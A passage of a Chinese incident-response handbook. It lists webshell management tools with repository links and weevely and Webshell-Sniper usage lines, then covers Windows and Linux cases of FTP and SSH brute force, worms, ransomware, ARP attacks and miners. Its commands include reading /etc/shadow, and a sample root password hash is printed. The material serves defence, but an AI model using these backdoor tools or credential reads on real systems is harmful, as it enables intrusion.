id="0x04-结束语"><a href="#0x04-结束语" class="headerlink" title="0x04 结束语"></a>0x04 结束语</h3><p>本文简单介绍了通过三大渗透框架进行权限维持的几种方法，了解攻击者常用的渗透框架及后门技术，有助于更好地去发现并解决服务器安全问题。</p><h2 id="第7篇：常见WebShell管理工具"><a href="#第7篇：常见WebShell管理工具" class="headerlink" title="第7篇：常见WebShell管理工具"></a>第7篇：常见WebShell管理工具</h2><p>攻击者在入侵网站时，通常要通过各种方式写入Webshell，从而获得服务器的控制权限，比如执行系统命令、读取配置文件、窃取用户数据，篡改网站页面等操作。</p><p>本文介绍十款常用的Webshell管理工具，以供你选择，你会选择哪一个？</p><hr><p><strong>1、中国菜刀(Chopper)</strong></p><p>中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。UNICODE方式编译，支持多国语言输入显示。</p><p><img src="/image/privilege-6-1.png" srcset="/img/loading.gif" alt=""></p><p><strong>2、蚁剑(AntSword)</strong></p><p>AntSword是一个开放源代码，跨平台的网站管理工具，旨在满足渗透测试人员以及具有权限和/或授权的安全研究人员以及网站管理员的需求。</p><p>github项目地址：<a href="https://github.com/AntSwordProject/antSword" target="_blank" rel="noopener">https://github.com/AntSwordProject/antSword</a></p><p><img src="/image/privilege-6-2.png" srcset="/img/loading.gif" alt=""></p><p><strong>3、C刀(Cknife)</strong></p><p>这是一款跨平台的基于配置文件的中国菜刀，把所有操作给予用户来定义。</p><p>github项目地址：<a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a></p><p><img src="/image/privilege-6-3.png" srcset="/img/loading.gif" alt=""></p><p><strong>4、冰蝎(Behinder)</strong></p><p>冰蝎”是一款动态二进制加密网站管理客户端。</p><p>github地址：<a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener">https://github.com/rebeyond/Behinder</a></p><p><img src="/image/privilege-6-4.png" srcset="/img/loading.gif" alt=""></p><p><strong>5、Xise</strong></p><p>XISE WebShell管理工具。</p><p><img src="/image/privilege-6-5.png" srcset="/img/loading.gif" alt=""></p><p><strong>6、Altman</strong></p><p>Altman3是一款渗透测试软件，基于.Net4.0开发，依托Eto.Form可以完美运行在Windows、Linux、Mac等多个平台。</p><p>github项目地址：<a href="https://github.com/keepwn/Altman" target="_blank" rel="noopener">https://github.com/keepwn/Altman</a></p><p><img src="/image/privilege-6-6.png" srcset="/img/loading.gif" alt=""></p><p><strong>7、Weevely</strong></p><p>Weevely是一种Python编写的webshell管理工具，跨平台，只支持PHP。</p><p>github项目地址：<a href="https://github.com/epinna/weevely3" target="_blank" rel="noopener">https://github.com/epinna/weevely3</a></p><p>用法示例：</p><pre><code class="hljs verilog">weevely <span class="hljs-keyword">generate</span> &lt;password&gt; &lt;path&gt;weevely &lt;URL&gt; &lt;password&gt; [cmd]</code></pre><p>同时，在Kali 2.0 版本下，集成了三款Web后门工具：WebaCoo、weevely、PHP Meterpreter。</p><p><img src="/image/privilege-6-7.png" srcset="/img/loading.gif" alt=""></p><p><strong>8、QuasiBot</strong></p><p>QuasiBot是一款php编写的webshell管理工具，可以对webshell进行远程批量管理。</p><p>github项目地址：<a href="https://github.com/Smaash/quasibot" target="_blank" rel="noopener">https://github.com/Smaash/quasibot</a></p><p><img src="/image/privilege-6-8.png" srcset="/img/loading.gif" alt=""></p><p><strong>9、Webshell-Sniper</strong></p><p>这是一款基于终端的webshell管理工具，仅支持在类Unix系统上运行。</p><p>github项目地址：<a href="https://github.com/WangYihang/Webshell-Sniper" target="_blank" rel="noopener">https://github.com/WangYihang/Webshell-Sniper</a></p><p>用法示例：</p><pre><code class="hljs oxygene">Usage :         python webshell-sniper.py [URL] [<span class="hljs-function"><span class="hljs-keyword">METHOD</span>] [<span class="hljs-title">AUTH</span>]</span><span class="hljs-function"><span class="hljs-title">Example</span> :</span>         python webshell-sniper.py http:<span class="hljs-comment">//127.0.0.1/c.php POST c</span></code></pre><p><img src="/image/privilege-6-9.png" srcset="/img/loading.gif" alt=""></p><p><strong>10、WebshellManager</strong></p><p>一款用PHP+Mysql写的一句话WEB端管理工具，目前仅支持对PHP的一句话进行操作。</p><p>github项目地址：<a href="https://github.com/boy-hack/WebshellManager" target="_blank" rel="noopener">https://github.com/boy-hack/WebshellManager</a></p><p><img src="/image/privilege-6-10.png" srcset="/img/loading.gif" alt=""></p><p>我在知识星球发起了一个小讨论，也收集到了一些webshell管理工具，如 hatchet、K8飞刀、lanker，欢迎补充。</p><h1 id="第四章：Windows实战篇"><a href="#第四章：Windows实战篇" class="headerlink" title="第四章：Windows实战篇"></a>第四章：Windows实战篇</h1><h2 id="第1篇：FTP暴力破解"><a href="#第1篇：FTP暴力破解" class="headerlink" title="第1篇：FTP暴力破解"></a>第1篇：FTP暴力破解</h2><h3 id="0x00-前言-6"><a href="#0x00-前言-6" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    FTP是一个文件传输协议，用户通过FTP可从客户机程序向远程主机上传或下载文件，常用于网站代码维护、日常源码备份等。如果攻击者通过FTP匿名访问或者弱口令获取FTP权限，可直接上传webshell，进一步渗透提权，直至控制整个网站服务器。</p><h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    从昨天开始，网站响应速度变得缓慢，网站服务器登录上去非常卡，重启服务器就能保证一段时间的正常访问，网站响应状态时而飞快时而缓慢，多数时间是缓慢的。针对网站服务器异常，系统日志和网站日志，是我们排查处理的重点。查看Window安全日志，发现大量的登录失败记录：</p><p><img src="/image/win-5-1.png" srcset="/img/loading.gif" alt=""></p><h3 id="0x02-日志分析"><a href="#0x02-日志分析" class="headerlink" title="0x02 日志分析"></a>0x02 日志分析</h3><p><strong>安全日志分析：</strong> </p><p>安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么。</p><p>打开安全日志，在右边点击筛选当前日志， 在事件ID填入4625，查询到事件ID4625，事件数177007，从这个数据可以看出，服务器正则遭受暴力破解：</p><p><img src="/image/win-5-2.png" srcset="/img/loading.gif" alt=""></p><p>进一步使用Log Parser对日志提取数据分析，发现攻击者使用了大量的用户名进行爆破，例如用户名：fxxx，共计进行了17826次口令尝试，攻击者基于“fxxx”这样一个域名信息，构造了一系列的用户名字典进行有针对性进行爆破，如下图：</p><p><img src="/image/win-5-3.png" srcset="/img/loading.gif" alt=""></p><p>这里我们留意到登录类型为8，来了解一下登录类型8是什么意思呢？</p><p><strong>登录类型8：网络明文（NetworkCleartext）</strong>   </p><p>这种登录表明这是一个像类型3一样的网络登录，但是这种登录的密码在网络上是通过明文传输的，WindowsServer服务是不允许通过明文验证连接到共享文件夹或打印机的，据我所知只有当从一个使用Advapi的ASP脚本登录或者一个用户使用基本验证方式登录IIS才会是这种登录类型。“登录过程”栏都将列出Advapi。  </p><p>我们推测可能是FTP服务，通过查看端口服务及管理员访谈，确认服务器确实对公网开放了FTP服务。</p><p><img src="/image/win-5-4.png" srcset="/img/loading.gif" alt=""></p><p>另外，日志并未记录暴力破解的IP地址，我们可以使用Wireshark对捕获到的流量进行分析，获取到正在进行爆破的IP：</p><p><img src="/image/win-5-5.png" srcset="/img/loading.gif" alt=""></p><p>通过对近段时间的管理员登录日志进行分析，如下：</p><p><img src="/image/win-5-6.png" srcset="/img/loading.gif" alt=""></p><p>管理员登录正常，并未发现异常登录时间和异常登录ip，这里的登录类型10，代表远程管理桌面登录。</p><p>另外，通过查看FTP站点，发现只有一个测试文件，与站点目录并不在同一个目录下面，进一步验证了FTP暴力破解并未成功。</p><p><img src="/image/win-5-7.png" srcset="/img/loading.gif" alt=""></p><p>应急处理措施：1、关闭外网FTP端口映射           2、删除本地服务器FTP测试</p><h3 id="0x04-处理措施"><a href="#0x04-处理措施" class="headerlink" title="0x04 处理措施"></a>0x04 处理措施</h3><p>​    FTP暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：</p><pre><code class="hljs angelscript"><span class="hljs-number">1</span>、禁止使用FTP传输文件，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于<span class="hljs-number">8</span>位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。<span class="hljs-number">2</span>、更改服务器FTP默认端口。<span class="hljs-number">3</span>、部署入侵检测设备，增强安全防护。</code></pre><h2 id="第2篇：蠕虫病毒"><a href="#第2篇：蠕虫病毒" class="headerlink" title="第2篇：蠕虫病毒"></a>第2篇：蠕虫病毒</h2><h3 id="0x00-前言-7"><a href="#0x00-前言-7" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    蠕虫病毒是一种十分古老的计算机病毒，它是一种自包含的程序（或是一套程序），通常通过网络途径传播，每入侵到一台新的计算机，它就在这台计算机上复制自己，并自动执行它自身的程序。</p><p>常见的蠕虫病毒：熊猫烧香病毒 、冲击波/震荡波病毒、conficker病毒等。</p><h3 id="0x01-应急场景-1"><a href="#0x01-应急场景-1" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天早上，管理员在出口防火墙发现内网服务器不断向境外IP发起主动连接，内网环境，无法连通外网，无图脑补。</p><h3 id="0x02-事件分析"><a href="#0x02-事件分析" class="headerlink" title="0x02 事件分析"></a>0x02 事件分析</h3><p>在出口防火墙看到的服务器内网IP，首先将中病毒的主机从内网断开，然后登录该服务器，打开D盾_web查杀查看端口连接情况，可以发现本地向外网IP发起大量的主动连接：</p><p><img src="/image/win-6-1.png" srcset="/img/loading.gif" alt=""></p><p>通过端口异常，跟踪进程ID，可以找到该异常由svchost.exe windows服务主进程引起，svchost.exe向大量远程IP的445端口发送请求：</p><p><img src="/image/win-6-2.png" srcset="/img/loading.gif" alt=""></p><p>这里我们推测可以系统进程被病毒感染，使用卡巴斯基病毒查杀工具，对全盘文件进行查杀，发现c:\windows\system32\qntofmhz.dll异常：</p><p><img src="/image/win-6-3.png" srcset="/img/loading.gif" alt=""></p><p>使用多引擎在线病毒扫描（<a href="http://www.virscan.org/）" target="_blank" rel="noopener">http://www.virscan.org/）</a> 对该文件进行扫描:</p><p><img src="/image/win-6-4.png" srcset="/img/loading.gif" alt=""></p><p>确认服务器感染conficker蠕虫病毒，下载conficker蠕虫专杀工具对服务器进行清查，成功清楚病毒。 </p><p><img src="/image/win-6-5.png" srcset="/img/loading.gif" alt=""></p><p>大致的处理流程如下:</p><pre><code class="hljs angelscript"><span class="hljs-number">1</span>、发现异常：出口防火墙、本地端口连接情况，主动向外网发起大量连接<span class="hljs-number">2</span>、病毒查杀：卡巴斯基全盘扫描，发现异常文件<span class="hljs-number">3</span>、确认病毒：使用多引擎在线病毒对该文件扫描，确认服务器感染conficker蠕虫病毒。<span class="hljs-number">4</span>、病毒处理：使用conficker蠕虫专杀工具对服务器进行清查，成功清除病毒。</code></pre><h3 id="0x04-预防处理措施"><a href="#0x04-预防处理措施" class="headerlink" title="0x04 预防处理措施"></a>0x04 <strong>预防处理措施</strong></h3><p>​    在政府、医院内网，依然存在着一些很古老的感染性病毒，如何保护电脑不受病毒感染，总结了几种预防措施：</p><pre><code class="hljs angelscript"><span class="hljs-number">1</span>、安装杀毒软件，定期全盘扫描<span class="hljs-number">2</span>、不使用来历不明的软件，不随意接入未经查杀的U盘<span class="hljs-number">3</span>、定期对windows系统漏洞进行修复，不给病毒可乘之机<span class="hljs-number">4</span>、做好重要文件的备份，备份，备份。</code></pre><h2 id="第3篇：勒索病毒"><a href="#第3篇：勒索病毒" class="headerlink" title="第3篇：勒索病毒"></a>第3篇：勒索病毒</h2><h3 id="0x00-前言-8"><a href="#0x00-前言-8" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    勒索病毒，是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。自WannaCry勒索病毒在全球爆发之后，各种变种及新型勒索病毒层出不穷。</p><h3 id="0x01-应急场景-2"><a href="#0x01-应急场景-2" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天早上，网站管理员打开OA系统，首页访问异常，显示乱码：</p><p><img src="/image/win-7-1.png" srcset="/img/loading.gif" alt=""></p><h3 id="0x02-事件分析-1"><a href="#0x02-事件分析-1" class="headerlink" title="0x02 事件分析"></a>0x02 事件分析</h3><p>​    登录网站服务器进行排查，在站点目录下发现所有的脚本文件及附件都被加密为.sage结尾的文件，每个文件夹下都有一个!HELP_SOS.hta文件，打包了部分样本：</p><p><img src="/image/win-7-2.png" srcset="/img/loading.gif" alt=""></p><p>打开!HELP_SOS.hta文件，显示如下： </p><p><img src="/image/win-7-3.png" srcset="/img/loading.gif" alt=""></p><p>到这里，基本可以确认是服务器中了勒索病毒，上传样本到360勒索病毒网站（<a href="http://lesuobingdu.360.cn）进行分析：确认web服务器中了sage勒索病毒，目前暂时无法解密。">http://lesuobingdu.360.cn）进行分析：确认web服务器中了sage勒索病毒，目前暂时无法解密。</a></p><p><img src="/image/win-7-4.png" srcset="/img/loading.gif" alt=""></p><p>绝大多数勒索病毒，是无法解密的，一旦被加密，即使支付也不一定能够获得解密密钥。在平时运维中应积极做好备份工作，数据库与源码分离（类似OA系统附件资源也很重要，也要备份）。 </p><p>遇到了，别急，试一试勒索病毒解密工具：</p><pre><code class="hljs avrasm">“拒绝勒索软件”网站<span class="hljs-symbol">https:</span>//www.nomoreransom<span class="hljs-meta">.org</span>/<span class="hljs-built_in">zh</span>/index.html<span class="hljs-number">360</span>安全卫士勒索病毒专题<span class="hljs-symbol">http:</span>//lesuobingdu<span class="hljs-number">.360</span>.cn</code></pre><h3 id="0x04-防范措施"><a href="#0x04-防范措施" class="headerlink" title="0x04 防范措施"></a>0x04 防范措施</h3><p>​    一旦中了勒索病毒，文件会被锁死，没有办法正常访问了，这时候，会给你带来极大的困恼。为了防范这样的事情出现，我们电脑上要先做好一些措施：</p><pre><code class="hljs angelscript"><span class="hljs-number">1</span>、安装杀毒软件，保持监控开启，定期全盘扫描<span class="hljs-number">2</span>、及时更新 Windows安全补丁，开启防火墙临时关闭端口，如<span class="hljs-number">445</span>、<span class="hljs-number">135</span>、<span class="hljs-number">137</span>、<span class="hljs-number">138</span>、<span class="hljs-number">139</span>、<span class="hljs-number">3389</span>等端口<span class="hljs-number">3</span>、及时更新web漏洞补丁，升级web组件<span class="hljs-number">4</span>、备份。重要的资料一定要备份，谨防资料丢失<span class="hljs-number">5</span>、强化网络安全意识，陌生链接不点击，陌生文件不要下载，陌生邮件不要打开</code></pre><h2 id="第4篇：ARP病毒"><a href="#第4篇：ARP病毒" class="headerlink" title="第4篇：ARP病毒"></a>第4篇：ARP病毒</h2><h3 id="0x00-前言-9"><a href="#0x00-前言-9" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>　　ARP病毒并不是某一种病毒的名称，而是对利用arp协议的漏洞进行传播的一类病毒的总称，目前在局域网中较为常见。发作的时候会向全网发送伪造的ARP数据包，严重干扰全网的正常运行，其危害甚至比一些蠕虫病毒还要严重得多。</p><h3 id="0x01-应急场景-3"><a href="#0x01-应急场景-3" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p> 　　某天早上，小伙伴给我发了一个微信，说192.168.64.76 CPU现在负载很高，在日志分析平台查看了一下这台服务器的相关日志，流量在某个时间点暴涨，发现大量137端口的UDP攻击。</p><p><img src="/image/win-9-1.png" srcset="/img/loading.gif" alt=""></p><h3 id="0x02-分析过程"><a href="#0x02-分析过程" class="headerlink" title="0x02 分析过程"></a>0x02 分析过程</h3><p> 　　登录服务器，首先查看137端口对应的进程，进程ID为4对应的进程是SYSTEM，于是使用杀毒软件进行全盘查杀。</p><p><img src="/image/win-9-2.png" srcset="/img/loading.gif" alt=""></p><p>卡巴斯基绿色版：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe" target="_blank" rel="noopener">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a></p><p>卡巴斯基、360杀毒、McAfee查杀无果，手工将启动项、计划任务、服务项都翻了一遍，并未发现异常。<br>本地下载了IpTool抓包工具，筛选条件： 协议 UDP  端口 137</p><p><img src="/image/win-9-3.png" srcset="/img/loading.gif" alt=""></p><p>可以明显的看出192.168.64.76发送的数据包是异常的，192.168.64.76的数据包目的地址，一直在变，目的MAC是不变的，而这个MAC地址就是网关的MAC。</p><p>端口137的udp包是netbios的广播包，猜测：可能是ARP病毒，由本机对外的ARP攻击。</p><p>采用措施：通过借助一些安全软件来实现局域网ARP检测及防御功能。</p><p>服务器安全狗Windows版下载：<a href="http://free.safedog.cn/server_safedog.html" target="_blank" rel="noopener">http://free.safedog.cn/server_safedog.html</a></p><p>网络防火墙–攻击防护–ARP防火墙：</p><p><img src="/image/win-9-4.png" srcset="/img/loading.gif" alt=""></p><p>虽然有拦截了部分ARP请求，但流量出口还是有一些137 UDF的数据包。</p><p>看来还是得下狠招，关闭137端口：禁用TCP/IP上的NetBIOS。</p><p>1）、禁用Server服务</p><p><img src="/image/win-9-5.png" srcset="/img/loading.gif" alt=""></p><p>2）、禁用 TCP/IP 上的 NetBIOS </p><p><img src="/image/win-9-6.png" srcset="/img/loading.gif" alt=""></p><p> 设置完，不用重启即可生效，137端口关闭，观察了一会，对外发起的请求已消失，CPU和网络带宽恢复正常。</p><h3 id="0x04-防护措施"><a href="#0x04-防护措施" class="headerlink" title="0x04 防护措施"></a>0x04 防护措施</h3><p>　　局域网安全防护依然是一项很艰巨的任务，网络的安全策略，个人/服务器的防毒机制，可以在一定程度上防止病毒入侵。</p><p>　　另外不管是个人PC还是服务器，总还是需要做一些基本的安全防护：1、关闭135/137/138/139/445等端口   2、更新系统补丁。</p><h2 id="第5篇：挖矿病毒（一）"><a href="#第5篇：挖矿病毒（一）" class="headerlink" title="第5篇：挖矿病毒（一）"></a>第5篇：挖矿病毒（一）</h2><h3 id="0x00-前言-10"><a href="#0x00-前言-10" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    随着虚拟货币的疯狂炒作，挖矿病毒已经成为不法分子利用最为频繁的攻击方式之一。病毒传播者可以利用个人电脑或服务器进行挖矿，具体现象为电脑CPU占用率高，C盘可使用空间骤降，电脑温度升高，风扇噪声增大等问题。</p><h3 id="0x01-应急场景-4"><a href="#0x01-应急场景-4" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天上午重启服务器的时候，发现程序启动很慢，打开任务管理器，发现cpu被占用接近100%，服务器资源占用严重。</p><p><img src="/image/win-8-1.png" srcset="/img/loading.gif" alt=""></p><h3 id="0x02-事件分析-2"><a href="#0x02-事件分析-2" class="headerlink" title="0x02 事件分析"></a>0x02 事件分析</h3><p>​    登录网站服务器进行排查，发现多个异常进程：</p><p><img src="/image/win-8-2.png" srcset="/img/loading.gif" alt=""></p><p>分析进程参数：</p><p>wmic process get caption,commandline /value &gt;&gt; tmp.txt</p><p><img src="/image/win-8-3.png" srcset="/img/loading.gif" alt=""></p><p>TIPS:</p><pre><code class="hljs livecodeserver">在windows下查看某个运行程序（或进程）的命令行参数使用下面的命令：wmic <span class="hljs-built_in">process</span> <span class="hljs-built_in">get</span> caption,commandline /<span class="hljs-built_in">value</span>如果想查询某一个进程的命令行参数，使用下列方式：wmic <span class="hljs-built_in">process</span> where caption=”svchost.exe” <span class="hljs-built_in">get</span> caption,commandline /<span class="hljs-built_in">value</span>这样就可以得到进程的可执行文件位置等信息。</code></pre><p>访问该链接：</p><p><img src="/image/win-8-4.png" srcset="/img/loading.gif" alt=""></p><p>Temp目录下发现Carbon、run.bat挖矿程序:</p><p><img src="/image/win-8-5.png" srcset="/img/loading.gif" alt=""></p><p>具体技术分析细节详见：</p><blockquote><p>360CERT：利用WebLogic漏洞挖矿事件分析</p><p><a href="https://www.anquanke.com/post/id/92223" target="_blank" rel="noopener">https://www.anquanke.com/post/id/92223</a></p></blockquote><p>清除挖矿病毒：关闭异常进程、删除c盘temp目录下挖矿程序 。</p><p><strong>临时防护方案</strong></p><ol><li><p>根据实际环境路径，删除WebLogic程序下列war包及目录</p><p>rm -f /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war</p><p>rm -f /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war</p><p>rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat </p></li><li><p>重启WebLogic或系统后，确认以下链接访问是否为404</p><p><a href="http://x.x.x.x:7001/wls-wsat" target="_blank" rel="noopener">http://x.x.x.x:7001/wls-wsat</a></p></li></ol><h3 id="0x04-防范措施-1"><a href="#0x04-防范措施-1" class="headerlink" title="0x04 防范措施"></a>0x04 防范措施</h3><p>​    新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率。通过利用永恒之蓝（EternalBlue）、web攻击多种漏洞，如Tomcat弱口令攻击、Weblogic WLS组件漏洞、Jboss反序列化漏洞，Struts2远程命令执行等，导致大量服务器被感染挖矿程序的现象 。总结了几种预防措施：</p><pre><code class="hljs angelscript"><span class="hljs-number">1</span>、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护<span class="hljs-number">2</span>、及时更新 Windows安全补丁，开启防火墙临时关闭端口<span class="hljs-number">3</span>、及时更新web漏洞补丁，升级web组件</code></pre><h2 id="第6篇：挖矿病毒（二）"><a href="#第6篇：挖矿病毒（二）" class="headerlink" title="第6篇：挖矿病毒（二）"></a>第6篇：挖矿病毒（二）</h2><h3 id="0x00-前言-11"><a href="#0x00-前言-11" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>　　作为一个运维工程师，而非一个专业的病毒分析工程师，遇到了比较复杂的病毒怎么办？别怕，虽然对二进制不熟，但是依靠系统运维的经验，我们可以用自己的方式来解决它。</p><h3 id="0x01-感染现象"><a href="#0x01-感染现象" class="headerlink" title="0x01 感染现象"></a>0x01 感染现象</h3><p>1、向大量远程IP的445端口发送请求</p><p><img src="/image/win-10-1.png" srcset="/img/loading.gif" alt=""></p><p>2、使用各种杀毒软件查杀无果，虽然能识别出在C:\Windows\NerworkDistribution中发现异常文件，但即使删除NerworkDistribution后，每次重启又会再次生成。 </p><p><img src="/image/win-10-2.jpg" srcset="/img/loading.gif" alt=""></p><p>连杀软清除不了的病毒，只能手工来吧，个人比较偏好火绒，界面比较简洁，功能也挺好用的，自带的火绒剑是安全分析利器。于是安装了火绒，有了如下分析排查过程。</p><h3 id="0x02-事件分析-3"><a href="#0x02-事件分析-3" class="headerlink" title="0x02 事件分析"></a>0x02 事件分析</h3><h4 id="A、网络链接"><a href="#A、网络链接" class="headerlink" title="A、网络链接"></a>A、网络链接</h4><p>通过现象，找到对外发送请求的进程ID：4960</p><p><img src="/image/win-10-3.png" srcset="/img/loading.gif" alt=""></p><h4 id="B、进程分析"><a href="#B、进程分析" class="headerlink" title="B、进程分析"></a>B、进程分析</h4><p>进一步通过进程ID找到相关联的进程，父进程为1464</p><p><img src="/image/win-10-4.png" srcset="/img/loading.gif" alt=""></p><p>找到进程ID为1464的服务项，逐一排查，我们发现服务项RemoteUPnPService存在异常。 </p><p><img src="/image/win-10-5.png" srcset="/img/loading.gif" alt=""></p><h4 id="C、删除服务"><a href="#C、删除服务" class="headerlink" title="C、删除服务"></a>C、删除服务</h4><p>选择可疑服务项，右键属性，停止服务，启动类型：禁止。</p><p><img src="/image/win-10-6.png" srcset="/img/loading.gif" alt=""></p><p>停止并禁用服务，再清除NerworkDistribution目录后，重启计算机。异常请求和目录的现象消失。</p><p>又排查了几台，现象一致，就是服务项的名称有点变化。</p><p><img src="/image/win-10-7.png" srcset="/img/loading.gif" alt=""></p><h4 id="D、病毒清除"><a href="#D、病毒清除" class="headerlink" title="D、病毒清除"></a>D、病毒清除</h4><p>挖矿病毒清除过程如下：</p><p>1、 停止并禁用可疑的服务项，服务项的名称会变，但描述是不变的，根据描述可快速找到可疑服务项。</p><p>​    可疑服务项描述：Enables a common interface and object model for the Remote UPnP Service to access</p><p>​    删除服务项：Sc delete RemoteUPnPService</p><p>2、  删除C:\Windows\NerworkDistribution目录</p><p>3、  重启计算机</p><p>4、  使用杀毒软件全盘查杀</p><p>5、  到微软官方网站下载对应操作系统补丁，下载链接：</p><p>　　<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010</a></p><h3 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h3><p>在查询了大量资料后，找到了一篇在2018年2月有关该病毒的报告：</p><p>NrsMiner：一个构造精密的挖矿僵尸网络</p><p><a href="https://www.freebuf.com/articles/system/162874.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/162874.html</a></p><p>根据文章提示，这个病毒的构造非常的复杂，主控模块作为服务“Hyper-VAccess Protection Agent Service”的ServiceDll存在。但与目前处理的情况有所不同，该病毒疑似是升级了。</p><h1 id="第五章：Linux实战篇"><a href="#第五章：Linux实战篇" class="headerlink" title="第五章：Linux实战篇"></a>第五章：Linux实战篇</h1><h2 id="第1篇：SSH暴力破解"><a href="#第1篇：SSH暴力破解" class="headerlink" title="第1篇：SSH暴力破解"></a>第1篇：SSH暴力破解</h2><h3 id="0x00-前言-12"><a href="#0x00-前言-12" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议，主要用于给远程登录会话数据进行加密，保证数据传输的安全。SSH口令长度太短或者复杂度不够，如仅包含数字，或仅包含字母等，容易被攻击者破解，一旦被攻击者获取，可用来直接登录系统，控制服务器所有权限。</p><h3 id="0x01-应急场景-5"><a href="#0x01-应急场景-5" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天，网站管理员登录服务器进行巡检时，发现端口连接里存在两条可疑的连接记录，如下图：</p><p><img src="/image/linux-10-1.png" srcset="/img/loading.gif" alt=""></p><ol><li><p>TCP初始化连接三次握手吧：发SYN包，然后返回SYN/ACK包，再发ACK包，连接正式建立。但是这里有点出入，当请求者收到SYS/ACK包后，就开始建立连接了，而被请求者第三次握手结束后才建立连接。</p></li><li><p>客户端TCP状态迁移：</p><p>​    CLOSED-&gt;SYN_SENT-&gt;ESTABLISHED-&gt;FIN_WAIT_1-&gt;FIN_WAIT_2-&gt;TIME_WAIT-&gt;CLOSED</p><p>服务器TCP状态迁移：</p><p>​    CLOSED-&gt;LISTEN-&gt;SYN recv-&gt;ESTABLISHED-&gt;CLOSE_WAIT-&gt;LAST_ACK-&gt;CLOSED</p></li><li><p>当客户端开始连接时，服务器还处于LISTENING，客户端发一个SYN包后，服务端接收到了客户端的SYN并且发送了ACK时，服务器处于SYN_RECV状态，然后并没有再次收到客户端的ACK进入ESTABLISHED状态，一直停留在SYN_RECV状态。</p><p>在这里，SSH（22）端口，两条外网IP的SYN_RECV状态连接，直觉告诉了管理员，这里一定有什么异常。</p></li></ol><h3 id="0x02-日志分析-1"><a href="#0x02-日志分析-1" class="headerlink" title="0x02 日志分析"></a>0x02 日志分析</h3><p>​    SSH端口异常，我们首先有必要先来了解一下系统账号情况：</p><p><strong>A、系统账号情况</strong></p><pre><code class="hljs angelscript"><span class="hljs-number">1</span>、除root之外，是否还有其它特权用户(uid 为<span class="hljs-number">0</span>)[<span class="hljs-symbol">root@</span>localhost ~]# awk -F: <span class="hljs-string">'$3==0{print $1}'</span> /etc/passwdroot<span class="hljs-number">2</span>、可以远程登录的帐号信息[<span class="hljs-symbol">root@</span>localhost ~]# awk <span class="hljs-string">'/\$1|\$6/{print $1}'</span> /etc/shadowroot:$<span class="hljs-number">6</span>$<span class="hljs-number">38</span>cKfZDjsTiUe58V$FP.UHWMObqeUQS1Z2KRj/<span class="hljs-number">4</span>EEcOPi<span class="hljs-number">.6</span>d1XmKHgK3j3GY9EGvwwBei7nUbbqJC./qK12HN8jFuXOfEYIKLID6hq0::<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::</code></pre><p>我们可以确认目前系统只有一个管理用户root。</p><p>接下来，我们想到的是/var/log/secure，这个日志文件记录了验证和授权方面的信息，只要涉及账号和密码的程序都会记录下来。</p><p><strong>B、确认攻击情况：</strong></p><pre><code class="hljs markdown">1、统计了下日志，发现大约有126254次登录失败的记录，确认服务器遭受暴力破解[root@localhost ~]# grep -o "Failed password" /var/log/secure|uniq -c<span class="hljs-code">     126254 Failed password</span><span class="hljs-code">     </span>2、输出登录爆破的第一行和最后一行，确认爆破时间范围：[root@localhost ~]# grep "Failed password" /var/log/secure|head -1Jul  8 20:14:59 localhost sshd[14323]: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2[root@localhost ~]# grep "Failed password" /var/log/secure|tail -1Jul 10 12:37:21 localhost sshd[2654]: Failed password for root from 111.13.xxx.xxx port 13068 ssh23、进一步定位有哪些IP在爆破？[<span class="hljs-string">root@localhost ~</span>]# grep "Failed password" /var/log/secure|grep -E -o "(25[<span class="hljs-string">0-5</span>]|2[<span class="hljs-string">0-4</span>][<span class="hljs-symbol">0-9</span>]|[<span class="hljs-string">01</span>]?[<span class="hljs-string">0-9</span>][<span class="hljs-symbol">0-9</span>]?)\.(25[<span class="hljs-string">0-5</span>]|2[<span class="hljs-string">0-4</span>][<span class="hljs-symbol">0-9</span>]|[<span class="hljs-string">01</span>]?[<span 